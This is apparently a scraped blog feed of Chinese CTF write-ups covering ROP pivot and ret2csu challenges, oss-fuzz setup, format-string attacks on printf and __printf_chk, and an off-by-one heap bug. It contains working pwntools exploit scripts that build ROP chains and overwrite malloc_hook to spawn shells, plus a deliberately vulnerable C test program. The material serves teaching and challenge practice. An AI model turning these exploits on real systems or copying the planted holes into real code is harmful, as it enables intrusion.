retgadget1 = 0x000000000040084e#pop r15 ; mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; retgadget2 = 0x000000000040084c#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retgadget3 = 0x0000000000400822#xor r11, r12 ; pop r12 ; mov r13, 0x604060 ; retgadget4 = 0x000000000040082f#xchg r11, r10 ; pop r15 ; mov r11, 0x602050 ; retgadget5 = 0x0000000000400840#pop r12 ; pop r13 ; pop r14 ; pop r15 ; retgadget6 = 0x00000000004008bcpayload = ""payload += 0x20 * "A" + p64(0)#将 data_addr 写入r10payload += p64(gadget6) + p64(data_addr) +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binshpayload += p64(gadget5) + p64(5)#将"/bin/sh\x00" 写入r11payload += p64(gadget6) + binsh +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binsh#data_addr = "/bin/sh\x00"payload += p64(gadget1) + p64(3) + p64(0)payload += p64(pop_rdi) + p64(data_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() pivot这道题有两次输入，第一次输入到堆中，第二次输入到栈中，而且很明显第二次的可溢出大小不够用来构造rop链，所以我们需要将rop链构造在堆中，然后利用栈迁移来执行rop链。题目中也将堆的地址打印了出来 ，降低了不少难度。给出的.so文件有这个函数可以用： 12345void __noreturn ret2win()&#123; system("/bin/cat flag.txt"); exit(0);&#125; 显然我们构造的rop链要能够控制程序跳转到这个函数去执行，这里需要用到计算偏移elf函数中只有foothold_function在.so中也出现，而且也在got表中，所以ret2win的真实地址可以结合foothold_function算出来，这里需要注意的是，需要先将foothold_function函数调用一次，got表中才有foothold_function的真实地址。这里说一下我踩过的坑，偏移有两种算法：1、真实地址-libc地址2、两个licb函数地址相减一开始我用第一种方法算偏移，理论上来说两种方法都没错，但是因为函数需要调用一次后才能在got表中有真实地址，所以直接拿got表中的地址来当真实地址的错的，所以最好使用第二种方法算偏移，然后在构造rop的时候将其中的一个地址调用一次使得got表中有它的真实地址再拿去加偏移就能得到目标函数的真实地址。exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *sh = process('./pivot32')elf = ELF('./pivot32')libc = ELF('./libpivot32.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']foothold_sym = libc.symbols['foothold_function']ret2win = libc.symbols['ret2win']# offset = int(foothold_got_plt - foothold_sym) 这里就是直接用got表的地址去算偏移，其实是错的，因为foothold_function函数没有调用过，got表中并不是真实地址# offset = int(ret2win - foothold_sym)offset = ret2win - foothold_sym#offset = foothold_sym - ret2win 这里算偏移的时候要注意结果不能为负数 sh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")leakaddr = int(sh.recv(10),16) #接收题目打印出来的堆地址print hex(leakaddr) pause()add_eax_ebx = 0x080488c7mov_eax_eax = 0x080488c4pop_eax = 0x080488c0pop_ebx = 0x08048571call_eax = 0x080486a3leave_ret = 0x080486a8payload_1 = ""payload_1 += p32(foothold_plt) #将foothold_function函数调用一次payload_1 += p32(pop_eax)payload_1 += p32(foothold_got_plt) #上面调用了一次这里就是真实地址了payload_1 += p32(mov_eax_eax)payload_1 += p32(pop_ebx)payload_1 += p32(offset)payload_1 += p32(add_eax_ebx)payload_1 += p32(call_eax)sh.sendline(payload_1)payload_2 = ""payload_2 += 0x28 * "A"payload_2 += p32(leakaddr-4) + p32(leave_ret)sh.sendline(payload_2)sh.interactive() 64位exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./pivot')elf = ELF('./pivot')so = ELF('./libpivot.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']footold_sym = so.symbols['foothold_function']ret2win_sym = so.symbols['ret2win']offset = ret2win_sym - footold_symsh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")addr = int(sh.recv(14),16)print hex(addr)pause()mov_rax_rax = 0x0000000000400b05 add_rax_rbp = 0x0000000000400b09pop_rax = 0x0000000000400b00pop_rbp = 0x0000000000400900pop_rdi = 0x0000000000400b73call_rax = 0x000000000040098e# pop_rsp_r13_r14_r15_ret = 0x0000000000400b6dxchg_rax_rsp = 0x0000000000400b02sh.recvuntil("&gt; ")payload_1 = ""payload_1 += p64(foothold_plt)payload_1 += p64(pop_rax) + p64(foothold_got_plt)payload_1 += p64(mov_rax_rax)payload_1 += p64(pop_rbp) + p64(offset)payload_1 += p64(add_rax_rbp)payload_1 += p64(call_rax)sh.sendline(payload_1)sh.recvuntil("&gt; ")payload_2 = ""payload_2 += 0x28*"A"payload_2 += p64(pop_rax) + p64(addr) + p64(xchg_rax_rsp)# payload_2 += p64(pop_rsp_r13_r14_r15_ret) + p64(addr) + p64(3) + p64(4) + p64(5)sh.sendline(payload_2)sh.interactive() ret2csu先checksec一波，no canry ,no pie 从IDA可以看到程序存在栈溢出漏洞和一个后门函数 但是这个后门函数需要三个参数，a1,a2随意，a3需要为0xdeadcafebabebeef,找一下gadget 并没有如pop rdx , mov rdx的gadget，这个时候，我们可以利用__libc_csu_init中的gadget 可以控制 r15,r14,r13的值 来达到控制 rdx,rsi,rdi的目的，这里因为有一个坑，setvbuf函数在调用的时候会将rdx赋值为0xffffffff,这样的话就不能成功调用ret2win了，所以找一个初始化函数调用一下exp: 12345678910111213141516171819202122232425262728#-*-coding:utf-8-*-from pwn import *p = process('./ret2csu')context.log_level = 'debug'init = 0x600E10 #初始化函数地址rop_1 = 0x400880rop_2 = 0x40089aret2win = 0x4007B1payload = 0x20*'a'payload += p64(0) #rbppayload += p64(rop_2)payload += p64(0) #rbxpayload += p64(1) #rbppayload += p64(init) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0xdeadcafebabebeef) #r15payload += p64(rop_1)payload += p64(0) #add rsp,8可以理解为pop操作，但是没有pop到寄存器，而有丢弃掉payload += p64(0) #rbxpayload += p64(0) #rbppayload += p64(0) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0) #r15payload += p64(ret2win)p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[oss-fuzz没什么用笔记]]></title>
    <url>%2F2020%2F06%2F21%2Foss-fuzz%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[0x01 什么是oss-fuzz谷歌的oss-fuzz能够针对开源软件进行持续的模糊测试，其测试开发团队也提到“OSS-Fuzz的目的是利用更新的模糊测试技术与可拓展的分布式执行相结合，提高一般软件基础架构的安全性与稳定性。OSS-Fuzz结合了多种模糊测试技术/漏洞捕捉技术（即原来的libfuzzer）与清洗技术（即原来的AddressSanitizer），并且通过ClusterFuzz为大规模可分布式执行提供了测试环境。”，当然fuzzer也可以选择AFL,libfuzzer 先下载源码 0x02 三个主要的文件project.yaml homepage:You project’s homepage.（没啥用） laguange:项目编写的编程语言，一般是c或c++ primary_contact, auto_css:联系人（也没啥用） sanitizer: 可以使用去更有效的查找 memory address bugs architectures: 架构 其它没啥用的就不一一介绍了 写个例子： 123456789101112131415homepage: "https://www.baidu.com"language: cprimary_contact: "kurt@roeckx.be"auto_ccs: - "openssl-security@openssl.org" - "appronym@gmail.com" - "caswell.matt@googlemail.com" - "richard@levitte.org"sanitizers: - address - memory - undefinedarchitectures: - x86_64 - i386 Dockerfile这个很重要，为项目定义了docker 镜像，build.sh也将在镜像中运行，长这样 1234567FROM gcr.io/oss-fuzz-base/base-builder # base image with clang toolchain,这个是谷歌上的镜像，把可先把它拖到dockerhub上然后替换掉，也可以换成我已经拖好的，后面会给出MAINTAINER YOUR_EMAIL # maintainer for this fileRUN apt-get update &amp;&amp; apt-get install -y ... # install required packages to build your projectRUN go get ... # install dependencies to build your Go projectRUN git clone &lt;git_url&gt; &lt;checkout_dir&gt; # checkout all sources needed to build your project，github上自己的项目WORKDIR &lt;checkout_dir&gt; # current directory for the build scriptCOPY build.sh fuzzer.cc $SRC/ # copy build script and other fuzzer files in src dir build.sh构建脚本，用来编译项目的，生成的二进制文件应放在$OUT中 示例，一般就是编译和复制语句 1234567891011121314#!/bin/bash -eu./buildconf.sh# configure scripts usually use correct environment variables../configuremake cleanmake -j$(nproc) all$CXX $CXXFLAGS -std=c++11 -Ilib/ \ $SRC/parse_fuzzer.cc -o $OUT/parse_fuzzer \ $LIB_FUZZING_ENGINE .libs/libexpat.acp $SRC/*.dict $SRC/*.options $OUT/ 以下位置对应的环境变量 /out/ –&gt; $OUT :用来存储构建好的文件 /src/ –&gt; $SRC : 放源文件的位置 /work/ –&gt; $WORK : 存储中间文件的位置 更多的变量可以参考官方文档 0x3 拉取镜像oss中用到的镜像都需要从谷歌拉取，有两种解决方法，给docker挂个代理然后直接pull；或者利用github+dockerhub的方法将所有的镜像先拖到dockerhub上，然后将源码中所有的gcr.io/oss-fuzz-base/xxxx改成对应dockerhub上的就行。教程（如果你壕无人性可以直接买个国外服务器，就不会有这些烦恼了） 也可以用我拉好的： 1234567gcr.io/oss-fuzz-base/base-image --&gt; r4bbit/base-imagegcr.io/oss-fuzz-base/base-clang --&gt; r4bbit/base-clanggcr.io/oss-fuzz-base/base-builder --&gt; r4bbit/oss-fuzz (这个名字就不要去介意了)gcr.io/oss-fuzz-base/base-runner --&gt; r4bbit/base-runnergcr.io/oss-fuzz-base/base-runner-debug --&gt; r4bbit/base-runner-debuggcr.io/oss-fuzz-base/base-msan-builder --&gt; r4bbit/base-msan-buildergcr.io/oss-fuzz-base/msan-builder --&gt; r4bbit/masn-builder 0x4 起oss中自带的project我们可以看到在project中有很多项目，这些都已经写好了build.sh、Dockerfile等必要文件 举个例子：openssl 12# ls projects/openssl/bignum.options build.sh Dockerfile project.yaml build.sh文件不用修改，需要将Dockerfile文件中的FROM gcr.io/oss-fuzz-base/base-builder修改为FROM r4bbit/oss-fuzz:latest 并且，infra/help.py 中BASE_IMAGES修改为对应的镜像地址 之后 根据文档中的test locally步骤将fuzz起起来 举个例子，我这里用的是engine 选 afl，sanitizer 选undefined 12# python infra/helper.py build_image openssl# python infra/helper.py build_fuzzers openssl --sanitizer undefined --engine afl build_fuzzers后可以在/path/to/oss/build/out中看到多了一个openssl文件夹，openssl而里面就有编译好的二进制文件 12# python infra/helper.py check_build openssl --sanitizer undefined --engine afl# python infra/helper.py run_fuzzer openssl --sanitizer undefined --engine afl server &lt;fuzzer_target:选一个自己想fuzz的文件&gt; check build pass后就可以开始fuzz了，（其实个觉得好像也没必要check，貌似也只是跑了一句docker），会在build/out/openssl下面生成新的文件夹server_afl_undefined_out，里面的东西就跟AFL一样了 0x5 fuzz自己写的程序如果想fuzz自己的程序就需要写build.sh和Dockerfile了，project.yaml倒不是很重要，模板上面已经有了，这里我直接举自己的例子。 先用c写一个漏洞程序 test.c 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;signal.h&gt;int vuln(char *str)&#123; int len = strlen(str); if(str[0] == 'A' &amp;&amp; len == 66) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 &#125; else if(str[0] == 'F' &amp;&amp; len == 6) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 &#125; else &#123; printf("it is good!\n"); &#125; return 0;&#125;int main(int argc, char *argv[])&#123; char buf[100]=&#123;0&#125;; gets(buf);//存在栈溢出漏洞 printf(buf);//存在格式化字符串漏洞 vuln(buf); return 0;&#125; 然后上传到github或者gitee，接下来写Dockerfile，直接套就行了 123456FROM r4bbit/oss-fuzz:latestMAINTAINER dvyukov@googlt.comRUN git clone --depth 1 https://gitee.com/R4bb1t-n0va/test.gitWORKDIR testCOPY build.sh afl* $SRC/ build.sh，这里说一下我踩过的坑 1234567# build projectgcc /src/test/test.c -o /src/test/test# build fuzzers$CXX $CXXFLAGS -std=c++11 -Iinclude \ /src/test/test.c -o $OUT/testcp $SRC/test/* $OUT/ 用gcc进行编译（肯定是我脑子糊了），在run_fuzzer时会报错：原因是没有插桩 123456789101112[-] Looks like the target binary is not instrumented! The fuzzer depends on compile-time instrumentation to isolate interesting test cases while mutating the input data. For more information, and for tips on how to instrument binaries, please see docs/README. When source code is not available, you may be able to leverage QEMU mode support. Consult the README for tips on how to enable this. (It is also possible to use afl-fuzz as a traditional, "dumb" fuzzer. For that, you can use the -n option - but expect much worse results.)[-] PROGRAM ABORT : No instrumentation detected Location : check_binary(), afl-fuzz.c:6959 所以需要换afl-gcc进行编译，在build_fuzzers步骤已经将afl-gcc等文件复制到/out/目录下了，所以将编译命令改成$OUT/afl-gcc /src/test/test.c -o /src/test/test，成功调用了afl-gcc进行编译，但是开始fuzz时又发现，还是没有插桩 对比一下正常情况下afl-gcc的编译情况可以发现 build.sh中没有调用afl-as，而afl-as的作用就是插桩，正常来讲指定AFL_PATH就能解决了，然而这里并没有解决，最后结合AFL源码，我用了一个方法：在build中建立 afl-as 软链接到 as 12345afl-gcc.c 中 find_as，让它在这里自己找到as_path if (!access(AFL_PATH "/as", X_OK)) &#123; as_path = AFL_PATH; return; &#125; 问题解决，最后成功的build.sh脚本 12345678910111213141516171819202122232425262728293031#!/bin/bash -eu# Copyright 2020 Google Inc.## Licensed under the Apache License, Version 2.0 (the "License");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an "AS IS" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.################################################################################## build project#gcc /src/test/test.c -o /src/test/test#export AFL_PATH=$OUT/#echo $AFL_PATH#pwd#which afl-gcc#which afl-asln -s $OUT/afl-as $OUT/as$OUT/afl-gcc /src/test/test.c -o /src/test/test# build fuzzers$CXX $CXXFLAGS -std=c++11 -Iinclude \ /src/test/test.c -o $OUT/testcp $SRC/test/* $OUT/]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>oss-fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[printf玩出了新花样]]></title>
    <url>%2F2020%2F06%2F21%2Fprintf%E7%8E%A9%E5%87%BA%E4%BA%86%E6%96%B0%E8%8A%B1%E6%A0%B7%2F</url>
    <content type="text"><![CDATA[1、2017-0ctf-EasiestPrintfcheckseck 12345Arch: i386-32-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) got 表不可改 程序逻辑很简单，先给你一个真实地址printf(&quot;%#x\n&quot;, *v1);，之后有一次printf(s)格式化字符串的机会，就调用exit退出 ，所以我们需要在这次printf(s)后就控制 EIP 需要注意的是，程序在leave前进行了一次随机抬栈v3 = alloca(16 * ((buf + 30) / 0x10u));所以想直接通过printf控制栈是不太可能的，因为偏移每次都不一样。而且got表不可改，也不存在将exit@got改为main。 这里需要知道一个点，printf 是会调用malloc和free函数的，在它需要输入一串比较长的字符时，需要临时申请空间来存放这些字符，输出后再调用free释放这部分空间。 所以这题的思路就是，将malloc_hook利用printf 修改为onegadget，然后通过%100000c来触发malloc调用onegadget exp: 123456789101112131415161718192021from pwn import *context.log_level = 'debug'p = process('./EasiestPrintf5')elf = ELF('./EasiestPrintf5')libc = ELF('/lib/i386-linux-gnu/libc.so.6')one = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]p.sendlineafter("read:\n",str(elf.got['read']))read_addr = int(p.recvuntil('\n')[:-1],16)libc_base = read_addr - libc.symbols['read']malloc_hook = libc_base + libc.symbols['__malloc_hook']malloc = libc_base + libc.symbols['malloc']onegadget = libc_base + one[2]log.info("read_addr --&gt; %s",hex(read_addr))log.info("malloc --&gt; %s",hex(malloc))pay = fmtstr_payload(7,&#123;malloc_hook:onegadget&#125;)pay += "%100000c"gdb.attach(p,"b *0x804881C")p.sendlineafter("Bye\n",pay)p.interactive() 2、easy_printf这道题来自星盟pwn平台，出自EX师傅的手，同时欢迎大家来我们的pwn平台刷题，题目质量绝对杠杠的 保护全开，环境是libc2.27,程序两个功能，1、调用printf_chk；2、调用printf且存在格式化字符串漏洞的 1234.text:0000000000000ADD call _printf.text:0000000000000AE2 mov edi, 0 ; error_code.text:0000000000000AE7 mov eax, 0E7h.text:0000000000000AEC syscall 可以看到调用完printf用程序也是直接退出了，所以利用方式还是跟0ctf一样通过调用malloc来get shell，但是首先要拿到libc_base 回头看printf_chk函数,printf_chk函数可以有效地阻拦格式化字符串的攻击，无法直接使用%x$p，也无法使用%n %a leak libc以下面代码为例 123456789101112#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() &#123; printf("%d,%d,%d,%d,%d,%d\n",1,2,3,4,5,6); printf("%f,%f,%f,%f,%f,%f\n",1.0,2.0,3.0,4.0,5.0,6.0); printf("%d,%f,%d,%f,%d,%f\n",1,2.0,3,4.0,5,6.0); printf("%d,%d,%d,%f,%f,%f\n",1.0,2.0,3.0,4,5,6); return 0;&#125; 64位下的__printf_chk编译 gcc -o test -t -O1 test.c 1234567891011► 0x400517 &lt;main&gt; sub rsp, 8 0x40051b &lt;main+4&gt; push 6 0x40051d &lt;main+6&gt; push 5 0x40051f &lt;main+8&gt; mov r9d, 4 0x400525 &lt;main+14&gt; mov r8d, 3 0x40052b &lt;main+20&gt; mov ecx, 2 0x400530 &lt;main+25&gt; mov edx, 1 0x400535 &lt;main+30&gt; lea rsi, [rip + 0x168] 0x40053c &lt;main+37&gt; mov edi, 1 0x400541 &lt;main+42&gt; mov eax, 0 0x400546 &lt;main+47&gt; call __printf_chk@plt &lt;0x400420&gt; 第一句，printf(&quot;%d,%d,%d,%d,%d,%d\n&quot;,1,2,3,4,5,6);遵守一般的调用约定,前6个参数通过寄存器rdi、rsi、rdx、rcx、rcx、r8、r9,剩余的参数通过栈传递 12345678910 0x40054b &lt;main+52&gt; movsd xmm5, qword ptr [rip + 0x19d] 0x400553 &lt;main+60&gt; movsd xmm4, qword ptr [rip + 0x19d] 0x40055b &lt;main+68&gt; movsd xmm3, qword ptr [rip + 0x19d] 0x400563 &lt;main+76&gt; movsd xmm2, qword ptr [rip + 0x19d] 0x40056b &lt;main+84&gt; movsd xmm1, qword ptr [rip + 0x19d]► 0x400573 &lt;main+92&gt; movsd xmm0, qword ptr [rip + 0x19d] 0x40057b &lt;main+100&gt; lea rsi, [rip + 0x135] 0x400582 &lt;main+107&gt; mov edi, 1 0x400587 &lt;main+112&gt; mov eax, 6 0x40058c &lt;main+117&gt; call __printf_chk@plt &lt;0x400420&gt; 第二句printf(&quot;%f,%f,%f,%f,%f,%f\n&quot;,1.0,2.0,3.0,4.0,5.0,6.0);浮点数通过浮点数寄存器xmm0到xmm7，剩下的参数通过栈来传递 12345678910 0x400591 &lt;main+122&gt; movsd xmm2, qword ptr [rip + 0x157] 0x400599 &lt;main+130&gt; mov r8d, 5 0x40059f &lt;main+136&gt; movsd xmm1, qword ptr [rip + 0x159] 0x4005a7 &lt;main+144&gt; mov ecx, 3 0x4005ac &lt;main+149&gt; movsd xmm0, qword ptr [rip + 0x15c]► 0x4005b4 &lt;main+157&gt; mov edx, 1 0x4005b9 &lt;main+162&gt; lea rsi, [rip + 0x10a] 0x4005c0 &lt;main+169&gt; mov edi, 1 0x4005c5 &lt;main+174&gt; mov eax, 3 0x4005ca &lt;main+179&gt; call __printf_chk@plt &lt;0x400420&gt; 第三句printf(&quot;%d,%f,%d,%f,%d,%f\n&quot;,1,2.0,3,4.0,5,6.0);和预想一样,整数存入整数寄存器,浮点数存入浮点数寄存器 12345678910 0x4005cf &lt;main+184&gt; mov r8d, 6 0x4005d5 &lt;main+190&gt; mov ecx, 5 0x4005da &lt;main+195&gt; mov edx, 4 0x4005df &lt;main+200&gt; movsd xmm2, qword ptr [rip + 0x121] 0x4005e7 &lt;main+208&gt; movsd xmm1, qword ptr [rip + 0x121]► 0x4005ef &lt;main+216&gt; movsd xmm0, qword ptr [rip + 0x121] 0x4005f7 &lt;main+224&gt; lea rsi, [rip + 0xdf] 0x4005fe &lt;main+231&gt; mov edi, 1 0x400603 &lt;main+236&gt; mov eax, 3 0x400608 &lt;main+241&gt; call __printf_chk@plt &lt;0x400420&gt; 第四句printf(&quot;%d,%d,%d,%f,%f,%f\n&quot;,1.0,2.0,3.0,4,5,6);1编译器在编译时会根据格式化字符串的值选择寄存器的类型而不是通过格式化字符串选择 那么，%a leak 的值是哪的呢？ 第一句printf(&quot;%d,%d,%d,%d,%d,%d\n&quot;,1,2,3,4,5,6);跟进__printf_chk函数,发现这里进行了堆栈操作，将之前寄存器的值压入栈中，之后一个条件跳转，接下来就是正常的执行流程了 123456789101112 0x7ffff7b161e1 &lt;__printf_chk+17&gt; test al, al 0x7ffff7b161e3 &lt;__printf_chk+19&gt; mov qword ptr [rsp + 0x30], rdx 0x7ffff7b161e8 &lt;__printf_chk+24&gt; mov qword ptr [rsp + 0x38], rcx 0x7ffff7b161ed &lt;__printf_chk+29&gt; mov qword ptr [rsp + 0x40], r8 0x7ffff7b161f2 &lt;__printf_chk+34&gt; mov qword ptr [rsp + 0x48], r9► 0x7ffff7b161f7 &lt;__printf_chk+39&gt; ✔ je __printf_chk+96 &lt;0x7ffff7b16230&gt; ↓ 0x7ffff7b16230 &lt;__printf_chk+96&gt; mov rax, qword ptr fs:[0x28] 0x7ffff7b16239 &lt;__printf_chk+105&gt; mov qword ptr [rsp + 0x18], rax 0x7ffff7b1623e &lt;__printf_chk+110&gt; xor eax, eax 0x7ffff7b16240 &lt;__printf_chk+112&gt; mov rbp, qword ptr [rip + 0x2b8cf9] 0x7ffff7b16247 &lt;__printf_chk+119&gt; mov rbx, qword ptr [rbp] 第二句printf(&quot;%f,%f,%f,%f,%f,%f\n&quot;,1.0,2.0,3.0,4.0,5.0,6.0);跟__printf_chk函数，发现这里虽然 没有使用整数寄存器，但是同样将整数寄存器压入栈中，之后 由于未符合条件未发生跳转，接下来将浮点数寄存器压入栈中 123456789101112 0x7ffff7b161e1 &lt;__printf_chk+17&gt; test al, al 0x7ffff7b161e3 &lt;__printf_chk+19&gt; mov qword ptr [rsp + 0x30], rdx 0x7ffff7b161e8 &lt;__printf_chk+24&gt; mov qword ptr [rsp + 0x38], rcx 0x7ffff7b161ed &lt;__printf_chk+29&gt; mov qword ptr [rsp + 0x40], r8 0x7ffff7b161f2 &lt;__printf_chk+34&gt; mov qword ptr [rsp + 0x48], r9► 0x7ffff7b161f7 &lt;__printf_chk+39&gt; je __printf_chk+96 &lt;0x7ffff7b16230&gt; 0x7ffff7b161f9 &lt;__printf_chk+41&gt; movaps xmmword ptr [rsp + 0x50], xmm0 0x7ffff7b161fe &lt;__printf_chk+46&gt; movaps xmmword ptr [rsp + 0x60], xmm1 0x7ffff7b16203 &lt;__printf_chk+51&gt; movaps xmmword ptr [rsp + 0x70], xmm2 0x7ffff7b16208 &lt;__printf_chk+56&gt; movaps xmmword ptr [rsp + 0x80], xmm3 0x7ffff7b16210 &lt;__printf_chk+64&gt; movaps xmmword ptr [rsp + 0x90], xmm4 那么，这个寄存器al是什么呢，在调用__printf_chk之前 会对eax赋值，其值为浮点数的个数，如果没有浮点数，其值为0，0x400587 &lt;main+112&gt; mov eax, 6 到这里我们可以推测栈的布局如下 12345678910111213141516171819202122232425262728293031+--------------------------+| value1 |+--------------------------+| value2 |+--------------------------+| ... |+--------------------------+| integer arg1 | &lt;= rdx(rsp + 0x30)+--------------------------+| integer arg2 | &lt;= rcx+--------------------------+| integer arg3 | &lt;= r8+--------------------------+| integer arg4 | &lt;= r9+--------------------------+| xmm arg1 | &lt;= xmm0(rsp + 0x50)+--------------------------+| ... |+--------------------------+| xmm arg7 | &lt;= xmm7+--------------------------+| rbp |+--------------------------+| ret |+--------------------------+| arg1 |+--------------------------+| ... |+--------------------------+| argn |+--------------------------+ 对于格式化字符串,在栈中有一段shadow space,用于将寄存器中的值压栈,这样有利于va_start (ap, format);的实现 shadow space中有一段栈空间用于保存整数型变量,一段栈空间用于保存浮点数类型变量,两者互不影响 在开始的时候会将所有用于传递整数类型的寄存器rdx、rcx、r8、r9压入栈用 之后会判断al的值是否为0,al为参数列表中使用xmm寄存器的个数,当al不为0时,会将所有的浮点数寄存器压入栈中 然后根据va_start (ap, format);读取相应栈上的值 所以，由于程序编译时参数列表并没有值，所以不会将浮点数寄存器压栈，但是在根据va_start(ap,format);读取的时候仍然会从shadow space中对应浮点数部分读取，因此我们leak出的是栈上本就存在的垃圾值 接下来的操作就跟上一题差不多了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#coding:utf-8from pwn import *from libformatstr import *context.log_level = 'debug'# p = process('./easy_printf')p = remote("nc.eonew.cn","10010")elf = ELF('./easy_printf')libc = elf.libcone = [0x4f2c5,0x4f322,0x10a38c]# p = remote("nc.eonew.cn","10010")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p.sendlineafter("choice: ",'1')# debug(0xa82)p.sendlineafter("fmt: \n","%a%a")p.recv(11)addr = p.recvuntil("p-")[:-2]addr += "00"libc_base = int(addr,16) - 0x3eba00free_hook = libc_base + libc.symbols['__free_hook']malloc_hook = libc_base + libc.symbols['__malloc_hook']malloc = libc_base + libc.symbols['malloc']free = libc_base + libc.symbols['free']onegadget = libc_base + one[1]log.info("libc_base --&gt; %s",hex(libc_base))p.sendlineafter('\n','2')log.info("malloc_hook --&gt; %s",hex(malloc_hook))log.info("free_hook --&gt; %s",hex(free_hook))log.info("malloc --&gt;%s",hex(malloc))log.info("free --&gt; %s",hex(free))log.info("onegadget --&gt; %s",hex(onegadget))# debug(0xadd)a = (onegadget &gt;&gt; 40) &amp; 0xffb = (onegadget &gt;&gt; 32) &amp; 0xffwhile b &lt; a: b += 0x100c = (onegadget &gt;&gt; 24) &amp; 0xffwhile c &lt; b: c += 0x100d = (onegadget &gt;&gt; 16) &amp; 0xffwhile d &lt; c: d += 0x100e = (onegadget &gt;&gt; 8) &amp; 0xffwhile e &lt; d: e += 0x100f = (onegadget) &amp; 0xffwhile f &lt; e: f += 0x100log.success("a: %s",hex(a))log.success("b: %s",hex(b))log.success("c: %s",hex(c))log.success("d: %s",hex(d))log.success("e: %s",hex(e))log.success("f: %s",hex(f))pay = ""pay += "%" + str(a) + "c%18$hhn"pay += "%" + str(b - a) + "c%19$hhn"pay += "%" + str(c - b) + "c%20$hhn"pay += "%" + str(d - c) + "c%21$hhn"pay += "%" + str(e - d) + "c%22$hhn"pay += "%" + str(f - e) + "c%23$hhn"pay += "%100000c"pay = pay.ljust(0x50,'A')pay += p64(malloc_hook+5)pay += p64(malloc_hook+4)pay += p64(malloc_hook+3)pay += p64(malloc_hook+2)pay += p64(malloc_hook+1)pay += p64(malloc_hook)'''py64 = FormatStr(isx64=1)py64[free_hook] = onegadgetpay = py64.payload(8)'''# pay = ""# pay += "%100000c"# pay += "%1024c%11$hn"# pay = pay.ljust(0x18,'A')# pay += p64(free_hook)p.sendline(pay)sleep(0.1)p.sendline("cat flag&gt;&amp;0")p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Off-By-One之Asis CTF 2016 b00s]]></title>
    <url>%2F2020%2F06%2F21%2FOff-By-One%E4%B9%8BAsis%20CTF%202016%20b00s%2F</url>
    <content type="text"><![CDATA[题目介绍题目是一个表单程序，功能是一个图书管理系统。 12345671. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt; 程序提供了创建、删除、编辑、打印、修改author name的功能，除了 canary 外，其他保护全开 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled 首先程序会要求输入author name，存到bss 段 unk_202040 中，限制大小为32，用自己构造的函数读取，接下来看create函数的功能：输入book name’s size 然后 malloc(size) ，读入name，限制长度是32，接着输入description’s size 也同样malloc(size)，读入description，不限制长度。接下来为book结构体申请一个0x20的空间 12345678910book = malloc(0x20uLL);if ( book )&#123; *(book + 6) = size; *(book_addr + id) = book; *(book + 2) = description; *(book + 1) = name; *book = ++unk_202024; return 0LL;&#125; book结构体的指针会存到unk_202060处，也就是authon name 紧跟着的后面 漏洞程序的主要漏洞就存在其自己构造的read函数中，因为对边界处理不当，导致写入时存在1个字节的溢出，即off-by-one 123456789101112131415161718192021signed __int64 __fastcall my_read(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == 10 ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125; 事实上，当写入author name最长长度32时，my_read 读入的结束符&#39;\x00&#39;是写到0x56260bc1b060上的，即unk_202040 + unk_202060也就是book_addr ，那么，当写入book1时，’\x00’就会被覆盖为book1的地址，通过打印author name就可以获得一个堆地址book1_addr。 12345678910111213pwndbg&gt; x/10gx 0x56260bc1b0400x56260bc1b040: 0x6161616161616161 0x61616161616161610x56260bc1b050: 0x6161616161616161 0x61616161616161610x56260bc1b060: 0x0000000000000000 0x00000000000000000x56260bc1b070: 0x0000000000000000 